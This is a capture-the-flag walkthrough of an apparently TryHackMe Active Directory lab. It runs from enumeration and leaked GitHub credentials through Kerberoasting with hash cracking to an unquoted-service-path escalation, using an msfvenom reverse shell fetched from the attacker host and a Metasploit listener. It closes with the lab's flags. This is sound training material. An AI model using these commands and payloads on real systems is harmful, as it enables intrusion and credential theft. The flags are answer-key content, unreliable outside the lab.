
# PORT SCAN
---

| PORT      | SERVICE       |
| --------- | ------------- |
| 53/tcp    | domain        |
| 80/tcp    | http          |
| 88/tcp    | kerberos-sec  |
| 135/tcp   | msrpc         |
| 139/tcp   | netbios-ssn   |
| 389/tcp   | ldap          |
| 445/tcp   | microsoft-ds? |
| 464/tcp   | kpasswd5?     |
| 593/tcp   | ncacn_http    |
| 636/tcp   | tcpwrapped    |
| 3389/tcp  | ms-wbt-server |
| 5357/tcp  | http          |
| 5985/tcp  | http          |
| 7990/tcp  | http          |
| 9389/tcp  | mc-nmf        |
| 47001/tcp | http          |
| 49664/tcp | msrpc         |
| 49665/tcp | msrpc         |
| 49666/tcp | msrpc         |
| 49668/tcp | msrpc         |
| 49671/tcp | msrpc         |
| 49674/tcp | ncacn_http    |
| 49675/tcp | msrpc         |
| 49680/tcp | msrpc         |
| 49709/tcp | msrpc         |
| 49715/tcp | msrpc         |


# RECONNAISSANCE
---

We need to add the DC and domain to `/etc/hosts`:

```bash
echo "10.10.246.252 LAB-DC.LAB.ENTERPRISE.THM LAB.ENTERPRISE.THM" | sudo tee -a /etc/hosts
```

Let's check the web applications we have first:

![image-78.png](../../../CyberSecurity/IMAGES/image-78.png)

We can try fuzzing:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.246.252/FUZZ" -ic -c -t 200 -e .php,.html,.txt,.git,.js

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.246.252/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions       : .php .html .txt .git .js
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

robots.txt              [Status: 200, Size: 110, Words: 17, Lines: 2, Duration: 233ms]
```

`robots.txt` entrance is allowed:

![image-79.png](../../../CyberSecurity/IMAGES/image-79.png)

Nothing else that we can fuzz, `vhost` fuzz doesn't bring anything too, let's check the other ones:

![image-80.png](../../../CyberSecurity/IMAGES/image-80.png)


![image-81.png](../../../CyberSecurity/IMAGES/image-81.png)

`7990` contains a `ATLASSIAN` login panel, if we try creating an account we get redirected to the real `Atlassian` page, so we need to skip that.

Instead, let's focus on the message on top:

```
Reminder to all Enterprise-THM Employees:
We are moving to Github!
```

We can maybe find a repository regarding `Enterprise-THM`, let's use a dork:

```
site:"github.com" "Enterprise-THM"
```

![image-82.png](../../../CyberSecurity/IMAGES/image-82.png)

We can see the official profile from the on top, let's check it up:

![image-83.png](../../../CyberSecurity/IMAGES/image-83.png)


We find there's a person on here:

![image-84.png](../../../CyberSecurity/IMAGES/image-84.png)


This user got a repository:

![image-85.png](../../../CyberSecurity/IMAGES/image-85.png)




It got two commits, if we go to the first commit, we can see this:

![image-86.png](../../../CyberSecurity/IMAGES/image-86.png)

We got some credentials, let's save them for now and enumerate further:

```
nik:ToastyBoi!
```

Another interesting finding, is that `SMB` anonymous login is enabled:

```
smbclient -L //10.10.246.252 -N
Can't load /etc/samba/smb.conf - run testparm to debug it

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Docs            Disk
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share
	SYSVOL          Disk      Logon server share
	Users           Disk      Users Share. Do Not Touch!
```

We can see a `Docs` and `Users` share on here, the user share doesn't have anything interesting aside from `dpapi` stuff, we get access to `AppData` on the `LAB-ADMIN` directory, if we dig further on this directory, we can find the credential blob and the masterkey, we can save them for now since we don't have the password to decrypt them using `dpapi.py`:

```python
smbclient //10.10.246.252/Users
Can't load /etc/samba/smb.conf - run testparm to debug it
Password for [WORKGROUP\samsepiol]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Fri Mar 12 02:11:49 2021
  ..                                 DR        0  Fri Mar 12 02:11:49 2021
  Administrator                       D        0  Thu Mar 11 21:55:48 2021
  All Users                       DHSrn        0  Sat Sep 15 07:28:48 2018
  atlbitbucket                        D        0  Thu Mar 11 22:53:06 2021
  bitbucket                           D        0  Fri Mar 12 02:11:51 2021
  Default                           DHR        0  Fri Mar 12 00:18:03 2021
  Default User                    DHSrn        0  Sat Sep 15 07:28:48 2018
  desktop.ini                       AHS      174  Sat Sep 15 07:16:48 2018
  LAB-ADMIN                           D        0  Fri Mar 12 00:28:14 2021
  Public                             DR        0  Thu Mar 11 21:27:02 2021

smb: \> cd LAB-ADMIN
smb: \LAB-ADMIN\> ls
  .                                   D        0  Fri Mar 12 00:28:14 2021
  ..                                  D        0  Fri Mar 12 00:28:14 2021
  AppData                            DH        0  Fri Mar 12 00:29:00 2021
  Desktop                            DR        0  Sat Sep 15 07:19:00 2018
  Documents                          DR        0  Thu Mar 11 22:53:06 2021
  Downloads                          DR        0  Sat Sep 15 07:19:00 2018
  Favorites                          DR        0  Sat Sep 15 07:19:00 2018
  Links                              DR        0  Sat Sep 15 07:19:00 2018
  Music                              DR        0  Sat Sep 15 07:19:00 2018
  Pictures                           DR        0  Sat Sep 15 07:19:00 2018
  Saved Games                         D        0  Sat Sep 15 07:19:00 2018
  Videos                             DR        0  Sat Sep 15 07:19:00 2018
```

Credential blob is located at:

```
LAB-ADMIN\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
```

And the Masterkey is located at:

```
LAB-ADMIN\AppData\Roaming\Microsoft\Protect\S-1-5-21-2168718921-3906202695-65158103-1000\655a0446-8420-431a-a5d7-2d18eb87b9c3
```

If you don't know about `dpapi`, i recommend checking the following article, `dpapi` privilege escalation can be seen on different rooms of platforms like `HackTheBox`, for example, the privilege escalation part of the `Puppy` machine, is done using this technique:

https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets#practice

Saving that for now, we can check this on the `Docs` share:

```python
smbclient //10.10.246.252/Docs
Can't load /etc/samba/smb.conf - run testparm to debug it
Password for [WORKGROUP\samsepiol]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 15 02:47:35 2021
  ..                                  D        0  Mon Mar 15 02:47:35 2021
  RSA-Secured-Credentials.xlsx        A    15360  Mon Mar 15 02:46:54 2021
  RSA-Secured-Document-PII.docx       A    18432  Mon Mar 15 02:45:24 2021

		15587583 blocks of size 4096. 9905118 blocks available
smb: \> mget *
Get file RSA-Secured-Credentials.xlsx? y
getting file \RSA-Secured-Credentials.xlsx of size 15360 as RSA-Secured-Credentials.xlsx (22.0 KiloBytes/sec) (average 22.0 KiloBytes/sec)
Get file RSA-Secured-Document-PII.docx? y
getting file \RSA-Secured-Document-PII.docx of size 18432 as RSA-Secured-Document-PII.docx (26.4 KiloBytes/sec) (average 24.2 KiloBytes/sec)
```


These are encrypted files, we can use `office2john` to attempt to crack them:

```python
office2john RSA-Secured-Credentials.xlsx > hash.txt
office2john RSA-Secured-Document-PII.docx > hashdocx.txt

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 128/128 AVX 4x / SHA512 128/128 AVX 2x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

john hashdocx.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 128/128 AVX 4x / SHA512 128/128 AVX 2x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 4 OpenMP threads
Crash recovery file is locked: /home/kali/.john/john.rec
```


Unfortunately, no hash cracked, let's proceed with the final enumeration then, remember we got credentials, we can use `bloodhound` then:

```python
bloodhound-python -d LAB.ENTERPRISE.THM -u 'nik' -p 'ToastyBoi!' -ns 10.10.246.252 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: lab.enterprise.thm
Traceback (most recent call last):
  File "/usr/bin/bloodhound-python", line 33, in <module>
    sys.exit(load_entry_point('bloodhound==1.8.0', 'console_scripts', 'bloodhound-python')())
             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^
  File "/usr/lib/python3/dist-packages/bloodhound/__init__.py", line 314, in main
    ad.dns_resolve(domain=args.domain, options=args)
    ~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/bloodhound/ad/domain.py", line 726, in dns_resolve
    q = self.dnsresolver.query(query.replace('pdc','gc'), 'SRV', tcp=self.dns_tcp)
  File "/usr/lib/python3/dist-packages/dns/resolver.py", line 1363, in query
    return self.resolve(
           ~~~~~~~~~~~~^
        qname,
        ^^^^^^
    ...<7 lines>...
        True,
        ^^^^^
    )
    ^
  File "/usr/lib/python3/dist-packages/dns/resolver.py", line 1320, in resolve
    timeout = self._compute_timeout(start, lifetime, resolution.errors)
  File "/usr/lib/python3/dist-packages/dns/resolver.py", line 1076, in _compute_timeout
    raise LifetimeTimeout(timeout=duration, errors=errors)
dns.resolver.LifetimeTimeout: The resolution lifetime expired after 3.101 seconds: Server Do53:10.10.246.252@53 answered The DNS operation timed out.
```

Unfortunately we can't use `bloodhound` due to a DNS problem on the machine, we can use `ldapdomaindump` and analyze the data manually:

```python
ldapdomaindump -u 'LAB.ENTERPRISE.THM\nik' -p 'ToastyBoi!' 10.10.246.252
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

We can see this on `domain_users.html`:

![image-87.png](../../../CyberSecurity/IMAGES/image-87.png)


We can see some credentials for `contractor-temp`, this credentials work for `smb` but not `winrm`:

```python
nxc smb 10.10.246.252 -u 'contractor-temp' -p 'Password123!' -d LAB.ENTERPRISE.THM
SMB         10.10.246.252   445    LAB-DC           [*] Windows 10 / Server 2019 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False)
SMB         10.10.246.252   445    LAB-DC           [+] LAB.ENTERPRISE.THM\contractor-temp:Password123!

nxc winrm 10.10.246.252 -u 'contractor-temp' -p 'Password123!' -d LAB.ENTERPRISE.THM
WINRM       10.10.246.252   5985   LAB-DC           [*] Windows 10 / Server 2019 Build 17763 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM)
WINRM       10.10.246.252   5985   LAB-DC           [-] LAB.ENTERPRISE.THM\contractor-temp:Password123!
```

If we check the `json` file for the users, we can find this:

![image-88.png](../../../CyberSecurity/IMAGES/image-88.png)

`bitbucket` user got a registered SPN, since we have this, we can perform a `kerberoasting` attack, let's proceed to exploitation.



# EXPLOITATION
---

Check what a `kerberoasting` attack is on here:

https://notes.benheater.com/books/active-directory/page/kerberoasting

Basically Kerberoasting is a post-authentication attack where a low-privileged domain user requests a Kerberos service ticket (TGS) for accounts with a registered SPN (Service Principal Name). The ticket is encrypted with the service account's NTLM hash, allowing the attacker to extract and crack it offline to recover the plaintext password.

Let's request a TGS for the `bitbucket` user, we can use either credential we found:

```python
GetUserSPNs.py LAB.ENTERPRISE.THM/contractor-temp:Password123! -dc-ip 10.10.246.252 -request

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name       MemberOf                                                     PasswordLastSet             LastLogon                   Delegation 
--------------------  ---------  -----------------------------------------------------------  --------------------------  --------------------------  ----------
HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM  2021-03-11 20:20:01.333272  2021-04-26 11:16:41.570158             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*bitbucket$LAB.ENTERPRISE.THM$LAB.ENTERPRISE.THM/bitbucket*$bd88165fcd4838270bff52c37d622b70$85ae3d9524825fbe79e42a0fc1a4173aa175289c1595e1b73a4915096200ef6b83fa28b3abddf1c811e2e73404127ebc3d522623fb0ea351822a9a6dc6ca6299fa896ce3621dd84f5fb001cc4d4487c19bd9d0bf85f2cd0d679b47b43096fb1697fec9b23951e9d972b2d8ca7aed28fb9deefe2d033bd26735260f9cc3e19e07be84f61471cb80e28132adef9de233e6ace4cd5c9fd9de36e7fcbec8730b1b2edc7add4f935f1b970dec7ec495778e06e47c0acf489f718bd6ec5789f28a34f670fc5c34319121813f201d6766caf729578d10af9b7cf40bda1a0fa22bf0e63cc0c33604a45a12130509b1e84207f820d8cbfebb7a9a4c672450a667743320ba32d3428dd24697ef7d529465298592fd6dd81cab0cc866df2eb94bfdeb271d82818c812a1d194431b1b2862e93234fa3ff653cb65e2d321a9a6bfde07d435ac8991aaaab27e589ba56335138fd11a3379558f0de754e64d5a460e76d4c024cfe44c610eb871c6f13bf396be42c36f9b479dfba76c4e0512ed289df68f1d8a2b9acacb02cecba6ddaf6c7b3fca95c1e0897861a186a39ff1c384e6c7e86e4b2e869efdc779e3603f5ce7f37a6e3e04c30fff6b6712845f9ff82b3ce4effc5682d8ac3b4549b141003fbf6ceb4c3d7493df0d96012f062023d2b24c9fc2771d80de5c46cc5dbb7c534bb36c013ad12d8f00ce4120073c08c9528a989efc9974c85629fc7a806f00c6c3bbfc2d8eb909845416b2525f73b857e1753789152bbae615a7a7ba9c8838ec64c056c7a52926d26fd12473228cf1925714ea13bf69aaee6614c7ba40aee2d279220a2cb7fb16eb4992e591b1fb4c6d19a4fcdba7d42bb1d7abc4b426dfe240a82286709f6839eaa220a3996e980c46c2df847cf5fceda1fa935a19850ac8058815719f3e550ad62fffd0e84ef45dddb0e3ca02ab952ee9267df93d75eda79cd28d7fbab2022ab737dad3c63b16b5c522a8ac2631825d525dd365437a28a238040d180e533a96657ef913127bad8cf596ab81b9e8a04036ad47db57775ce8f6b8f58354dcb580a257bb26cfcf1f6e2096ee9500f86e4d951daed68e20b0483d982f788575efece1ba42c117d49567e798699414a73c6e980e57194add7eb67283a810ac531148158603a5e556367403366587df4b67f1a7934987575e9d8221bce9084cca09ae2b4701d8b9b2005889d978debe62d650a85e9f4f50a91f4b19c721605e66d0b80c43835c0f772ec92a0713bb5cb5b0f41f2cef371853f3c81d8060ba0d9b025a5195ad3bfe25332b25d9fea5b02b7a72a04ff2a22a0c2e2236a73531a9fffe4b7e51bb4b75b35f4654e650675a8a2e55e5474697aa64aeadea029b798287307c9067793e2cb5815d70774015791883a671f5e4a103a05f7396074c6d3b1f98426ad44e1b68664a7851f2a73e76c0c6f65f7d79b438cd19020dae92c8849169e3ec0322c9e6ca9735e0ecdd46d6c9ae39f50c8a16b128a4907a01ae024ecc316e0
```

We got our TGS, let's crack it using hashcat:

```python
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt


$krb5tgs$23$*bitbucket$LAB.ENTERPRISE.THM$LAB.ENTERPRISE.THM/bitbucket*$bd88165fcd4838270bff52c37d622b70$85ae3d9524825fbe79e42a0fc1a4173aa175289c1595e1b73a4915096200ef6b83fa28b3abddf1c811e2e73404127ebc3d522623fb0ea351822a9a6dc6ca6299fa896ce3621dd84f5fb001cc4d4487c19bd9d0bf85f2cd0d679b47b43096fb1697fec9b23951e9d972b2d8ca7aed28fb9deefe2d033bd26735260f9cc3e19e07be84f61471cb80e28132adef9de233e6ace4cd5c9fd9de36e7fcbec8730b1b2edc7add4f935f1b970dec7ec495778e06e47c0acf489f718bd6ec5789f28a34f670fc5c34319121813f201d6766caf729578d10af9b7cf40bda1a0fa22bf0e63cc0c33604a45a12130509b1e84207f820d8cbfebb7a9a4c672450a667743320ba32d3428dd24697ef7d529465298592fd6dd81cab0cc866df2eb94bfdeb271d82818c812a1d194431b1b2862e93234fa3ff653cb65e2d321a9a6bfde07d435ac8991aaaab27e589ba56335138fd11a3379558f0de754e64d5a460e76d4c024cfe44c610eb871c6f13bf396be42c36f9b479dfba76c4e0512ed289df68f1d8a2b9acacb02cecba6ddaf6c7b3fca95c1e0897861a186a39ff1c384e6c7e86e4b2e869efdc779e3603f5ce7f37a6e3e04c30fff6b6712845f9ff82b3ce4effc5682d8ac3b4549b141003fbf6ceb4c3d7493df0d96012f062023d2b24c9fc2771d80de5c46cc5dbb7c534bb36c013ad12d8f00ce4120073c08c9528a989efc9974c85629fc7a806f00c6c3bbfc2d8eb909845416b2525f73b857e1753789152bbae615a7a7ba9c8838ec64c056c7a52926d26fd12473228cf1925714ea13bf69aaee6614c7ba40aee2d279220a2cb7fb16eb4992e591b1fb4c6d19a4fcdba7d42bb1d7abc4b426dfe240a82286709f6839eaa220a3996e980c46c2df847cf5fceda1fa935a19850ac8058815719f3e550ad62fffd0e84ef45dddb0e3ca02ab952ee9267df93d75eda79cd28d7fbab2022ab737dad3c63b16b5c522a8ac2631825d525dd365437a28a238040d180e533a96657ef913127bad8cf596ab81b9e8a04036ad47db57775ce8f6b8f58354dcb580a257bb26cfcf1f6e2096ee9500f86e4d951daed68e20b0483d982f788575efece1ba42c117d49567e798699414a73c6e980e57194add7eb67283a810ac531148158603a5e556367403366587df4b67f1a7934987575e9d8221bce9084cca09ae2b4701d8b9b2005889d978debe62d650a85e9f4f50a91f4b19c721605e66d0b80c43835c0f772ec92a0713bb5cb5b0f41f2cef371853f3c81d8060ba0d9b025a5195ad3bfe25332b25d9fea5b02b7a72a04ff2a22a0c2e2236a73531a9fffe4b7e51bb4b75b35f4654e650675a8a2e55e5474697aa64aeadea029b798287307c9067793e2cb5815d70774015791883a671f5e4a103a05f7396074c6d3b1f98426ad44e1b68664a7851f2a73e76c0c6f65f7d79b438cd19020dae92c8849169e3ec0322c9e6ca9735e0ecdd46d6c9ae39f50c8a16b128a4907a01ae024ecc316e0:littleredbucket
```


Nice, got credentials for the `bitbucket` user:

```
bitbucket:littleredbucket
```

Let's check what we can access with this credentials:

```python
nxc smb 10.10.246.252 -u 'bitbucket' -p 'littleredbucket' -d LAB.ENTERPRISE.THM

SMB         10.10.246.252   445    LAB-DC           [*] Windows 10 / Server 2019 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False) 
SMB         10.10.246.252   445    LAB-DC           [+] LAB.ENTERPRISE.THM\bitbucket:littleredbucket 
 nxc winrm 10.10.246.252 -u 'bitbucket' -p 'littleredbucket' -d LAB.ENTERPRISE.THM

WINRM       10.10.246.252   5985   LAB-DC           [*] Windows 10 / Server 2019 Build 17763 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM)

WINRM       10.10.246.252   5985   LAB-DC           [-] LAB.ENTERPRISE.THM\bitbucket:littleredbucket
❯ nxc rdp 10.10.246.252 -u 'bitbucket' -p 'littleredbucket' -d LAB.ENTERPRISE.THM

RDP         10.10.246.252   3389   LAB-DC           [*] Windows 10 or Windows Server 2016 Build 17763 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (nla:False)
RDP         10.10.246.252   3389   LAB-DC           [+] LAB.ENTERPRISE.THM\bitbucket:littleredbucket (Pwn3d!)
```

We can access `rdp`, let's do it:

```bash
xfreerdp3 /u:bitbucket /p:littleredbucket /d:LAB.ENTERPRISE.THM /v:10.10.246.252 /cert:ignore +clipboard /dynamic-resolution
```

![image-89.png](../../../CyberSecurity/IMAGES/image-89.png)

As seen, we got the user flag on the Desktop, let's skip that for now and check any PE vectors, time to begin privilege escalation.

# PRIVILEGE ESCALATION
---

Since we can't run `bloodhound`, it's difficult to check relations and DACLs abuse for this machine, instead, let's use `winpeas`, we can host it on our machine and get it with:

```powershell
Invoke-WebRequest -Uri http://<VPN_IP>:8000/winPEAS.ps1 -OutFile winpeas.ps1
```

Make sure to host a python server with:

```
python3 -m http.server
```

Here's winPEAS repository in case you don't have it:

https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS

We can now use `winpeas` and check the output:

![image-90.png](../../../CyberSecurity/IMAGES/image-90.png)

We find an unquoted service path that runs as `LocalSystem`, the:

```
C:\Program Files (x86)\Zero Tier\Zero Tier One\zeroTier One.exe
```

We can create a malicious `exe` file and upload it to this location, once we restart the service and run it again, we'll get a shell as `SYSTEM`, let's do it.

First of all, we need to create the shell:

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o Zero.exe
```

Let's transfer the file to the machine using the same command as earlier:

```powershell
Invoke-WebRequest -Uri http://<VPN_IP>:8000/Zero.exe -OutFile Zero.exe
```

![image-94.png](../../../CyberSecurity/IMAGES/image-94.png)

As we can see, we got our reverse shell on here, we need to set the listener and restart the service:

```powershell
Start-Service zerotieroneservice
```

You can start the listener with:

```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell/reverse_tcp; set LHOST IP; set LPORT 4444; run"
```

Once we do it, this happens:

![image-93.png](../../../CyberSecurity/IMAGES/image-93.png)

If we check our listener:

![image-96.png](../../../CyberSecurity/IMAGES/image-96.png)

We got a shell as `nt authority\system`, let's read both flags and end the CTF:

```powershell
C:\Windows\system32>type C:\Users\bitbucket\Desktop\user.txt

THM{ed882d02b34246536ef7da79062bef36}

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt

THM{1a1fa94875421296331f145971ca4881}
```

![image-97.png](../../../CyberSecurity/IMAGES/image-97.png)

